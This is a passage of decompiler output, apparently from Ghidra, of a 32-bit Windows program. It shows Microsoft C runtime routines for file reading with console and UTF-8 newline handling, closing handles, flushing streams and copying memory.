            *(int *)(iVar11 + 0x28 + iVar12) = (int)lVar20;
            *(int *)(iVar11 + 0x2c + iVar12) = (int)((ulonglong)lVar20 >> 0x20);
          }
          else {
            _Size = param_3;
            if (cVar3 == '\x02') {
              if ((~param_3 & 1) == 0) goto LAB_0040983e;
              _Size = param_3 & 0xfffffffe;
            }
            local_14 = param_2;
          }
          uVar13 = _Size;
          local_20 = local_14;
          if ((((*(byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12) & 0x48) != 0) &&
              (cVar2 = *(char *)((&DAT_0041b8c0)[local_10] + 5 + iVar12), cVar2 != '\n')) &&
             (_Size != 0)) {
            *(char *)local_14 = cVar2;
            local_20 = (LPWSTR)((int)local_14 + 1);
            uVar16 = 1;
            uVar13 = _Size - 1;
            *(undefined *)((&DAT_0041b8c0)[local_10] + 5 + iVar12) = 10;
            if (((cVar3 != '\0') &&
                (cVar2 = *(char *)((&DAT_0041b8c0)[local_10] + 0x25 + iVar12), cVar2 != '\n')) &&
               (uVar13 != 0)) {
              *(char *)local_20 = cVar2;
              local_20 = local_14 + 1;
              uVar13 = _Size - 2;
              uVar16 = 2;
              *(undefined *)((&DAT_0041b8c0)[local_10] + 0x25 + iVar12) = 10;
              if (((cVar3 == '\x01') &&
                  (cVar2 = *(char *)((&DAT_0041b8c0)[local_10] + 0x26 + iVar12), cVar2 != '\n')) &&
                 (uVar13 != 0)) {
                uVar16 = 3;
                *(char *)local_20 = cVar2;
                local_20 = (LPWSTR)((int)local_14 + 3);
                uVar13 = _Size - 3;
                *(undefined *)((&DAT_0041b8c0)[local_10] + 0x26 + iVar12) = 10;
              }
            }
          }
          bVar4 = FUN_0040e5f9(param_1);
          if ((((CONCAT31(extraout_var,bVar4) == 0) ||
               ((*(byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12) & 0x80) == 0)) ||
              (local_24 = (WCHAR *)GetConsoleMode(*(HANDLE *)((&DAT_0041b8c0)[local_10] + iVar12),
                                                  (LPDWORD)&local_24), local_24 == (WCHAR *)0x0)) ||
             (cVar3 != '\x02')) {
            BVar8 = ReadFile(*(HANDLE *)((&DAT_0041b8c0)[local_10] + iVar12),local_20,uVar13,
                             &local_18,(LPOVERLAPPED)0x0);
            if (((BVar8 != 0) && (-1 < (int)local_18)) && (local_18 <= uVar13)) goto LAB_00409a25;
            uVar9 = GetLastError();
            if (uVar9 != 5) {
              if (uVar9 == 0x6d) {
                uVar13 = 0;
                goto LAB_00409c9a;
              }
              goto LAB_004099d0;
            }
            piVar7 = __errno();
            *piVar7 = 9;
            puVar6 = ___doserrno();
            *puVar6 = 5;
          }
          else {
            BVar8 = ReadConsoleW(*(HANDLE *)((&DAT_0041b8c0)[local_10] + iVar12),local_20,
                                 uVar13 >> 1,&local_18,(PCONSOLE_READCONSOLE_CONTROL)0x0);
            if (BVar8 != 0) {
              local_18 = local_18 * 2;
LAB_00409a25:
              uVar16 = uVar16 + local_18;
              iVar11 = (&DAT_0041b8c0)[local_10];
              bVar4 = *(byte *)(iVar11 + 4 + iVar12);
              uVar13 = local_1c;
              if (-1 < (char)bVar4) goto LAB_00409c9a;
              if (cVar3 == '\x02') {
                if (local_24 == (WCHAR *)0x0) {
                  if ((local_18 == 0) || (*local_14 != L'\n')) {
                    bVar4 = bVar4 & 0xfb;
                  }
                  else {
                    bVar4 = bVar4 | 4;
                  }
                  *(byte *)(iVar11 + 4 + iVar12) = bVar4;
                  local_24 = (WCHAR *)((int)local_14 + uVar16);
                  iVar11 = local_10;
                  pWVar14 = local_14;
                  pWVar18 = local_14;
                  if (local_14 < local_24) {
                    do {
                      WVar5 = *pWVar18;
                      if (WVar5 == L'\x1a') {
                        bVar4 = *(byte *)((&DAT_0041b8c0)[iVar11] + 4 + iVar12);
                        if ((bVar4 & 0x40) == 0) {
                          *(byte *)((&DAT_0041b8c0)[iVar11] + 4 + iVar12) = bVar4 | 2;
                        }
                        else {
                          *pWVar14 = *pWVar18;
                          pWVar14 = pWVar14 + 1;
                        }
                        break;
                      }
                      if (WVar5 == L'\r') {
                        if (pWVar18 < local_24 + -1) {
                          if (pWVar18[1] != L'\n') {
                            *pWVar14 = L'\r';
                            iVar11 = local_10;
                            goto LAB_00409daf;
                          }
                          pWVar18 = pWVar18 + 2;
                          *pWVar14 = L'\n';
LAB_00409e91:
                          pWVar14 = pWVar14 + 1;
                          iVar11 = local_10;
                        }
                        else {
                          pWVar18 = pWVar18 + 1;
                          BVar8 = ReadFile(*(HANDLE *)((&DAT_0041b8c0)[iVar11] + iVar12),&local_c,2,
                                           &local_18,(LPOVERLAPPED)0x0);
                          if (((BVar8 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) ||
                             (local_18 == 0)) {
                            *pWVar14 = L'\r';
                            pWVar14 = pWVar14 + 1;
                            iVar11 = local_10;
                          }
                          else {
                            iVar11 = local_10;
                            if ((*(byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12) & 0x48) == 0) {
                              if ((pWVar14 == local_14) && (local_c == 10)) {
                                *pWVar14 = L'\n';
                                pWVar14 = pWVar14 + 1;
                              }
                              else {
                                __lseeki64_nolock(param_1,0x1ffffffff,unaff_EDI);
                                iVar11 = local_10;
                                if (local_c != 10) {
                                  *pWVar14 = L'\r';
                                  goto LAB_00409e91;
                                }
                              }
                            }
                            else if (local_c == 10) {
                              *pWVar14 = L'\n';
                              pWVar14 = pWVar14 + 1;
                            }
                            else {
                              *pWVar14 = L'\r';
                              *(undefined *)((&DAT_0041b8c0)[local_10] + 5 + iVar12) =
                                   (undefined)local_c;
                              *(undefined *)((&DAT_0041b8c0)[local_10] + 0x25 + iVar12) =
                                   local_c._1_1_;
                              pWVar14 = pWVar14 + 1;
                              *(undefined *)((&DAT_0041b8c0)[local_10] + 0x26 + iVar12) = 10;
                            }
                          }
                        }
                      }
                      else {
                        *pWVar14 = WVar5;
LAB_00409daf:
                        pWVar14 = pWVar14 + 1;
                        pWVar18 = pWVar18 + 1;
                      }
                    } while (pWVar18 < local_24);
                  }
                  uVar16 = (int)pWVar14 - (int)local_14;
                  uVar13 = local_1c;
                }
                else {
                  pWVar14 = local_14;
                  pWVar18 = local_14;
                  while (pWVar14 < local_14 + (int)uVar16 / 2) {
                    WVar5 = *pWVar14;
                    if (WVar5 == L'\x1a') {
                      pbVar1 = (byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12);
                      *pbVar1 = *pbVar1 | 2;
                      break;
                    }
                    if (WVar5 == L'\r') {
                      if (pWVar14 < local_14 + (int)uVar16 / 2 + -1) {
                        pWVar14 = pWVar14 + 1;
                        WVar5 = L'\n';
                        if (*pWVar14 != L'\n') {
                          WVar5 = L'\r';
                        }
                        *pWVar18 = WVar5;
                        pWVar18 = pWVar18 + 1;
                      }
                    }
                    else {
                      *pWVar18 = WVar5;
                      pWVar18 = pWVar18 + 1;
                      pWVar14 = pWVar14 + 1;
                    }
                  }
                  uVar16 = (int)pWVar18 - (int)local_14 & 0xfffffffe;
                }
                goto LAB_00409c9a;
              }
              if ((local_18 == 0) || (*(char *)local_14 != '\n')) {
                bVar4 = bVar4 & 0xfb;
              }
              else {
                bVar4 = bVar4 | 4;
              }
              *(byte *)(iVar11 + 4 + iVar12) = bVar4;
              local_20 = (LPWSTR)((int)local_14 + uVar16);
              local_24 = local_14;
              iVar11 = local_10;
              pWVar14 = local_14;
              pWVar15 = local_14;
              if (local_14 < local_20) {
                do {
                  cVar2 = *(char *)pWVar15;
                  if (cVar2 == '\x1a') {
                    bVar4 = *(byte *)((&DAT_0041b8c0)[iVar11] + 4 + iVar12);
                    if ((bVar4 & 0x40) == 0) {
                      *(byte *)((&DAT_0041b8c0)[iVar11] + 4 + iVar12) = bVar4 | 2;
                    }
                    else {
                      *(undefined *)pWVar14 = *(undefined *)pWVar15;
                      pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                    }
                    break;
                  }
                  if (cVar2 == '\r') {
                    if (pWVar15 < (LPWSTR)((int)local_20 + -1)) {
                      pWVar17 = (LPWSTR)((int)pWVar15 + 1);
                      if (*(char *)pWVar17 == '\n') {
                        pWVar17 = pWVar15 + 1;
                        *(undefined *)pWVar14 = 10;
LAB_00409b57:
                        pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                      }
                      else {
                        *(undefined *)pWVar14 = 0xd;
                        pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                      }
                    }
                    else {
                      pWVar17 = (LPWSTR)((int)pWVar15 + 1);
                      BVar8 = ReadFile(*(HANDLE *)((&DAT_0041b8c0)[iVar11] + iVar12),&local_5,1,
                                       &local_18,(LPOVERLAPPED)0x0);
                      if (((BVar8 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) ||
                         (local_18 == 0)) {
                        *(undefined *)pWVar14 = 0xd;
                        pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                        iVar11 = local_10;
                      }
                      else {
                        iVar11 = local_10;
                        if ((*(byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12) & 0x48) == 0) {
                          if ((pWVar14 == local_14) && (local_5 == '\n')) {
                            *(undefined *)pWVar14 = 10;
                            pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                          }
                          else {
                            __lseeki64_nolock(param_1,0x1ffffffff,unaff_EDI);
                            iVar11 = local_10;
                            if (local_5 != '\n') {
                              *(undefined *)pWVar14 = 0xd;
                              goto LAB_00409b57;
                            }
                          }
                        }
                        else if (local_5 == '\n') {
                          *(undefined *)pWVar14 = 10;
                          pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                        }
                        else {
                          *(undefined *)pWVar14 = 0xd;
                          pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                          *(char *)((&DAT_0041b8c0)[local_10] + 5 + iVar12) = local_5;
                        }
                      }
                    }
                  }
                  else {
                    *(char *)pWVar14 = cVar2;
                    pWVar14 = (LPWSTR)((int)pWVar14 + 1);
                    pWVar17 = (LPWSTR)((int)pWVar15 + 1);
                  }
                  pWVar15 = pWVar17;
                } while (pWVar17 < local_20);
              }
              uVar16 = (int)pWVar14 - (int)local_14;
              uVar13 = local_1c;
              if ((cVar3 != '\x01') || (uVar16 == 0)) goto LAB_00409c9a;
              bVar4 = *(byte *)(LPWSTR)((int)pWVar14 + -1);
              if ((char)bVar4 < '\0') {
                iVar11 = 1;
                cVar3 = (&DAT_0041a440)[bVar4];
                pWVar14 = (LPWSTR)((int)pWVar14 + -1);
                while (((cVar3 == '\0' && (iVar11 < 5)) && (local_14 <= pWVar14))) {
                  pWVar14 = (LPWSTR)((int)pWVar14 + -1);
                  iVar11 = iVar11 + 1;
                  cVar3 = (&DAT_0041a440)[*(byte *)pWVar14];
                }
                if ((char)(&DAT_0041a440)[*(byte *)pWVar14] == 0) {
                  piVar7 = __errno();
                  *piVar7 = 0x2a;
                  goto LAB_004099d7;
                }
                if ((char)(&DAT_0041a440)[*(byte *)pWVar14] + 1 == iVar11) {
                  pWVar14 = (LPWSTR)((int)pWVar14 + iVar11);
                }
                else if ((*(byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12) & 0x48) == 0) {
                  __lseeki64_nolock(param_1,CONCAT44(1,-iVar11 >> 0x1f),unaff_EDI);
                }
                else {
                  pWVar15 = (LPWSTR)((int)pWVar14 + 1);
                  *(undefined *)((&DAT_0041b8c0)[local_10] + 5 + iVar12) = *(undefined *)pWVar14;
                  if (1 < iVar11) {
                    *(undefined *)((&DAT_0041b8c0)[local_10] + 0x25 + iVar12) =
                         *(undefined *)pWVar15;
                    pWVar15 = pWVar14 + 1;
                  }
                  if (iVar11 == 3) {
                    *(undefined *)((&DAT_0041b8c0)[local_10] + 0x26 + iVar12) =
                         *(undefined *)pWVar15;
                    pWVar15 = (LPWSTR)((int)pWVar15 + 1);
                  }
                  pWVar14 = (LPWSTR)((int)pWVar15 - iVar11);
                }
              }
              uVar13 = (int)pWVar14 - (int)local_14;
              uVar16 = MultiByteToWideChar(0xfde9,0,(LPCSTR)local_14,uVar13,param_2,param_3 >> 1);
              if (uVar16 != 0) {
                bVar19 = uVar16 != uVar13;
                uVar16 = uVar16 * 2;
                *(uint *)((&DAT_0041b8c0)[local_10] + 0x30 + iVar12) = (uint)bVar19;
                uVar13 = local_1c;
                goto LAB_00409c9a;
              }
            }
            uVar9 = GetLastError();
LAB_004099d0:
            FID_conflict___dosmaperr(uVar9);
          }
LAB_004099d7:
          uVar13 = 0xffffffff;
LAB_00409c9a:
          if (local_14 != param_2) {
            FID_conflict__free(local_14);
          }
          if (uVar13 != 0xfffffffe) {
            return uVar13;
          }
          return uVar16;
        }
LAB_0040983e:
        puVar6 = ___doserrno();
        *puVar6 = 0;
      }
      else {
        puVar6 = ___doserrno();
        *puVar6 = 0;
      }
      piVar7 = __errno();
      *piVar7 = 0x16;
      goto LAB_00409f1a;
    }
  }
  puVar6 = ___doserrno();
  *puVar6 = 0;
  piVar7 = __errno();
  *piVar7 = 9;
LAB_00409f1a:
  FUN_00407ceb();
  return 0xffffffff;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

undefined4 __cdecl FUN_00409f27(uint param_1)

{
  ulong *puVar1;
  int *piVar2;
  undefined4 uVar3;
  int iVar4;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
      iVar4 = (param_1 & 0x1f) * 0x40;
      if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
        ___lock_fhandle(param_1);
        if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          uVar3 = 0xffffffff;
        }
        else {
          uVar3 = FUN_00409ff1(param_1);
        }
        FUN_00409fc8();
        return uVar3;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_00407ceb();
  }
  return 0xffffffff;
}



void FUN_00409fc8(void)

{
  int unaff_ESI;
  
  __unlock_fhandle(unaff_ESI);
  return;
}



undefined4 __cdecl FUN_00409ff1(uint param_1)

{
  int iVar1;
  int iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  undefined4 uVar5;
  
  iVar1 = FUN_0040fdd6(param_1);
  if (iVar1 != -1) {
    if (((param_1 == 1) && ((*(byte *)(DAT_0041b8c0 + 0x84) & 1) != 0)) ||
       ((param_1 == 2 && ((*(byte *)(DAT_0041b8c0 + 0x44) & 1) != 0)))) {
      iVar1 = FUN_0040fdd6(2);
      iVar2 = FUN_0040fdd6(1);
      if (iVar2 == iVar1) goto LAB_0040a055;
    }
    hObject = (HANDLE)FUN_0040fdd6(param_1);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0040a057;
    }
  }
LAB_0040a055:
  DVar4 = 0;
LAB_0040a057:
  __free_osfhnd(param_1);
  *(undefined *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + (param_1 & 0x1f) * 0x40) = 0;
  if (DVar4 == 0) {
    uVar5 = 0;
  }
  else {
    FID_conflict___dosmaperr(DVar4);
    uVar5 = 0xffffffff;
  }
  return uVar5;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2012 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((*(byte *)&_File->_flag & 0x83) != 0) && ((*(byte *)&_File->_flag & 8) != 0)) {
    FID_conflict__free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2012 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  uint uVar2;
  DWORD DVar3;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        uVar2 = __fileno(_File);
        DVar3 = FUN_0040fee5(uVar2);
        iVar1 = -(uint)(DVar3 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2012 Release

int __cdecl __flush(FILE *_File)

{
  WCHAR *pWVar1;
  WCHAR *pWVar2;
  int iVar3;
  WCHAR *pWVar4;
  WCHAR *pWVar5;
  
  iVar3 = 0;
  if (((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) &&
     (pWVar4 = (WCHAR *)(_File->_ptr + -(int)_File->_base), 0 < (int)pWVar4)) {
    pWVar2 = (WCHAR *)_File->_base;
    pWVar5 = pWVar4;
    pWVar1 = (WCHAR *)__fileno(_File);
    pWVar2 = (WCHAR *)FUN_0040a8a4(pWVar1,pWVar2,pWVar5);
    if (pWVar2 == pWVar4) {
      if ((char)_File->_flag < '\0') {
        _File->_flag = _File->_flag & 0xfffffffd;
      }
    }
    else {
      _File->_flag = _File->_flag | 0x20;
      iVar3 = -1;
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar3;
}



void FUN_0040a165(void)

{
  _flsall(1);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Library: Visual Studio 2012 Release

int __cdecl _flsall(int param_1)

{
  void *_File;
  FILE *_File_00;
  int iVar1;
  int _Index;
  int iVar2;
  int local_28;
  
  iVar2 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_0041cf84; _Index = _Index + 1) {
    _File = *(void **)(DAT_0041cf80 + _Index * 4);
    if ((_File != (void *)0x0) && ((*(byte *)((int)_File + 0xc) & 0x83) != 0)) {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_0041cf80 + _Index * 4);
      if ((*(byte *)&_File_00->_flag & 0x83) != 0) {
        if (param_1 == 1) {
          iVar1 = __fflush_nolock(_File_00);
          if (iVar1 != -1) {
            iVar2 = iVar2 + 1;
          }
        }
        else if ((param_1 == 0) && ((*(byte *)&_File_00->_flag & 2) != 0)) {
          iVar1 = __fflush_nolock(_File_00);
          if (iVar1 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0040a216();
    }
  }
  FUN_0040a249();
  if (param_1 != 1) {
    iVar2 = local_28;
  }
  return iVar2;
}



void FUN_0040a216(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_0041cf80 + unaff_ESI * 4));
  return;
}



void FUN_0040a249(void)

{
  FUN_0040ed0f(1);
  return;
}



// WARNING: Control flow encountered bad instruction data
// Library Function - Multiple Matches With Different Base Names
//  _memcpy
//  _memmove
// 
// Libraries: Visual Studio 2012 Debug, Visual Studio 2012 Release

void * __cdecl FID_conflict__memcpy(void *_Dst,void *_Src,size_t _Size)

{
  undefined8 uVar1;
  undefined auVar2 [32];
  undefined auVar3 [32];
  undefined4 uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  undefined4 uVar7;
  undefined4 uVar8;
  undefined4 uVar9;
  undefined4 uVar10;
  undefined4 uVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 uVar14;
  undefined4 uVar15;
  int iVar16;
  undefined8 *puVar17;
  void *pvVar18;
  uint uVar19;
  uint uVar20;
  int iVar21;
  undefined8 *puVar22;
  undefined *puVar23;
  undefined4 *puVar24;
  undefined4 *puVar25;
  undefined4 uVar26;
  undefined4 uVar27;
  undefined4 uVar28;
  
  if ((_Src < _Dst) && (_Dst < (void *)(_Size + (int)_Src))) {
    puVar25 = (undefined4 *)((_Size - 4) + (int)_Src);
    puVar24 = (undefined4 *)((_Size - 4) + (int)_Dst);
    if (((uint)puVar24 & 3) == 0) {
      uVar19 = _Size >> 2;
      uVar20 = _Size & 3;
      if (7 < uVar19) {
        for (; uVar19 != 0; uVar19 = uVar19 - 1) {
          *puVar24 = *puVar25;
          puVar25 = puVar25 + -1;
          puVar24 = puVar24 + -1;
        }
        switch(uVar20) {
        case 0:
          return _Dst;
        case 2:
          goto switchD_0040a607_caseD_2;
        case 3:
          goto switchD_0040a607_caseD_3;
        }
        goto switchD_0040a607_caseD_1;
      }
    }
    else {
      switch(_Size) {
      case 0:
        goto switchD_0040a607_caseD_0;
      case 1:
        goto switchD_0040a607_caseD_1;
      case 2:
        goto switchD_0040a607_caseD_2;
      case 3:
        goto switchD_0040a607_caseD_3;
      default:
        uVar19 = _Size - ((uint)puVar24 & 3);
        switch((uint)puVar24 & 3) {
        case 1:
          uVar20 = uVar19 & 3;
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          puVar25 = (undefined4 *)((int)puVar25 + -1);
          uVar19 = uVar19 >> 2;
          puVar24 = (undefined4 *)((int)puVar24 - 1);
          if (7 < uVar19) {
            for (; uVar19 != 0; uVar19 = uVar19 - 1) {
              *puVar24 = *puVar25;
              puVar25 = puVar25 + -1;
              puVar24 = puVar24 + -1;
            }
            switch(uVar20) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040a607_caseD_2;
            case 3:
              goto switchD_0040a607_caseD_3;
            }
            goto switchD_0040a607_caseD_1;
          }
          break;
        case 2:
          uVar20 = uVar19 & 3;
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          uVar19 = uVar19 >> 2;
          *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
          puVar25 = (undefined4 *)((int)puVar25 + -2);
          puVar24 = (undefined4 *)((int)puVar24 - 2);
          if (7 < uVar19) {
            for (; uVar19 != 0; uVar19 = uVar19 - 1) {
              *puVar24 = *puVar25;
              puVar25 = puVar25 + -1;
              puVar24 = puVar24 + -1;
            }
            switch(uVar20) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040a607_caseD_2;
            case 3:
              goto switchD_0040a607_caseD_3;
            }
            goto switchD_0040a607_caseD_1;
          }
          break;
        case 3:
          uVar20 = uVar19 & 3;
          *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
          *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
          uVar19 = uVar19 >> 2;
          *(undefined *)((int)puVar24 + 1) = *(undefined *)((int)puVar25 + 1);
          puVar25 = (undefined4 *)((int)puVar25 + -3);
          puVar24 = (undefined4 *)((int)puVar24 - 3);
          if (7 < uVar19) {
            for (; uVar19 != 0; uVar19 = uVar19 - 1) {
              *puVar24 = *puVar25;
              puVar25 = puVar25 + -1;
              puVar24 = puVar24 + -1;
            }
            switch(uVar20) {
            case 0:
              return _Dst;
            case 2:
              goto switchD_0040a607_caseD_2;
            case 3:
              goto switchD_0040a607_caseD_3;
            }
            goto switchD_0040a607_caseD_1;
          }
        }
      }
    }
    switch(uVar19) {
    case 7:
      puVar24[7 - uVar19] = puVar25[7 - uVar19];
    case 6:
      puVar24[6 - uVar19] = puVar25[6 - uVar19];
    case 5:
      puVar24[5 - uVar19] = puVar25[5 - uVar19];
    case 4:
      puVar24[4 - uVar19] = puVar25[4 - uVar19];
    case 3:
      puVar24[3 - uVar19] = puVar25[3 - uVar19];
    case 2:
      puVar24[2 - uVar19] = puVar25[2 - uVar19];
    case 1:
      puVar24[1 - uVar19] = puVar25[1 - uVar19];
      puVar25 = puVar25 + -uVar19;
      puVar24 = puVar24 + -uVar19;
    }
    switch(uVar20) {
    case 1:
switchD_0040a607_caseD_1:
      *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
      return _Dst;
    case 2:
switchD_0040a607_caseD_2:
      *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
      *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
      return _Dst;
    case 3:
switchD_0040a607_caseD_3:
      *(undefined *)((int)puVar24 + 3) = *(undefined *)((int)puVar25 + 3);
      *(undefined *)((int)puVar24 + 2) = *(undefined *)((int)puVar25 + 2);
      *(undefined *)((int)puVar24 + 1) = *(undefined *)((int)puVar25 + 1);
      return _Dst;
    }
switchD_0040a607_caseD_0:
    return _Dst;
  }
  puVar23 = (undefined *)_Dst;
  if ((DAT_0041bbd4 >> 1 & 1) != 0) {
                    // WARNING: Load size is inaccurate
    for (; _Size != 0; _Size = _Size - 1) {
      *puVar23 = *_Src;
      _Src = (undefined *)((int)_Src + 1);
      puVar23 = puVar23 + 1;
    }
    return _Dst;
  }
  puVar25 = (undefined4 *)_Dst;
  if (_Size < 0x80) {
LAB_0040a46b:
    if (((uint)_Dst & 3) == 0) goto LAB_0040a473;
LAB_0040a488:
    switch(_Size) {
    case 0:
      goto switchD_0040a480_caseD_0;
    case 1:
      goto switchD_0040a480_caseD_1;
    case 2:
      goto switchD_0040a480_caseD_2;
    case 3:
      goto switchD_0040a480_caseD_3;
    default:
      uVar19 = (_Size - 4) + ((uint)_Dst & 3);
      switch((uint)_Dst & 3) {
      case 0:
                    // WARNING: Bad instruction - Truncating control flow here
        halt_baddata();
      case 1:
        uVar20 = uVar19 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        uVar19 = uVar19 >> 2;
        *(undefined *)((int)_Dst + 2) = *(undefined *)((int)_Src + 2);
        _Src = (void *)((int)_Src + 3);
        puVar25 = (undefined4 *)((int)_Dst + 3);
        if (7 < uVar19) {
                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040a480_caseD_2;
          case 3:
            goto switchD_0040a480_caseD_3;
          }
          goto switchD_0040a480_caseD_1;
        }
        break;
      case 2:
        uVar20 = uVar19 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        uVar19 = uVar19 >> 2;
        *(undefined *)((int)_Dst + 1) = *(undefined *)((int)_Src + 1);
        _Src = (void *)((int)_Src + 2);
        puVar25 = (undefined4 *)((int)_Dst + 2);
        if (7 < uVar19) {
                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040a480_caseD_2;
          case 3:
            goto switchD_0040a480_caseD_3;
          }
          goto switchD_0040a480_caseD_1;
        }
        break;
      case 3:
        uVar20 = uVar19 & 3;
                    // WARNING: Load size is inaccurate
        *(undefined *)_Dst = *_Src;
        _Src = (void *)((int)_Src + 1);
        uVar19 = uVar19 >> 2;
        puVar25 = (undefined4 *)((int)_Dst + 1);
        if (7 < uVar19) {
                    // WARNING: Load size is inaccurate
          for (; uVar19 != 0; uVar19 = uVar19 - 1) {
            *puVar25 = *_Src;
            _Src = (undefined4 *)((int)_Src + 4);
            puVar25 = puVar25 + 1;
          }
          switch(uVar20) {
          case 0:
            return _Dst;
          case 2:
            goto switchD_0040a480_caseD_2;
          case 3:
            goto switchD_0040a480_caseD_3;
          }
          goto switchD_0040a480_caseD_1;
        }
      }
    }
  }
  else {
    if (((((uint)_Dst ^ (uint)_Src) & 0xf) == 0) && ((DAT_0041a588 >> 1 & 1) != 0)) {
      if (((uint)_Src & 0xf) != 0) {
        uVar20 = 0x10 - ((uint)_Src & 0xf);
        _Size = _Size - uVar20;
        for (uVar19 = uVar20 & 3; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
          *(undefined *)puVar25 = *_Src;
          _Src = (void *)((int)_Src + 1);
          puVar25 = (undefined4 *)((int)puVar25 + 1);
        }
        for (uVar20 = uVar20 >> 2; uVar20 != 0; uVar20 = uVar20 - 1) {
                    // WARNING: Load size is inaccurate
          *puVar25 = *_Src;
          _Src = (void *)((int)_Src + 4);
          puVar25 = puVar25 + 1;
        }
      }
      for (uVar19 = _Size >> 7; uVar19 != 0; uVar19 = uVar19 - 1) {
                    // WARNING: Load size is inaccurate
        uVar26 = *(undefined4 *)((int)_Src + 4);
        uVar27 = *(undefined4 *)((int)_Src + 8);
        uVar28 = *(undefined4 *)((int)_Src + 0xc);
        uVar4 = *(undefined4 *)((int)_Src + 0x10);
        uVar5 = *(undefined4 *)((int)_Src + 0x14);
        uVar6 = *(undefined4 *)((int)_Src + 0x18);
        uVar7 = *(undefined4 *)((int)_Src + 0x1c);
        uVar8 = *(undefined4 *)((int)_Src + 0x20);
        uVar9 = *(undefined4 *)((int)_Src + 0x24);
        uVar10 = *(undefined4 *)((int)_Src + 0x28);
        uVar11 = *(undefined4 *)((int)_Src + 0x2c);
        uVar12 = *(undefined4 *)((int)_Src + 0x30);
        uVar13 = *(undefined4 *)((int)_Src + 0x34);
        uVar14 = *(undefined4 *)((int)_Src + 0x38);
        uVar15 = *(undefined4 *)((int)_Src + 0x3c);
        *puVar25 = *_Src;
        puVar25[1] = uVar26;
        puVar25[2] = uVar27;
        puVar25[3] = uVar28;
        puVar25[4] = uVar4;
        puVar25[5] = uVar5;
        puVar25[6] = uVar6;
        puVar25[7] = uVar7;
        puVar25[8] = uVar8;
        puVar25[9] = uVar9;
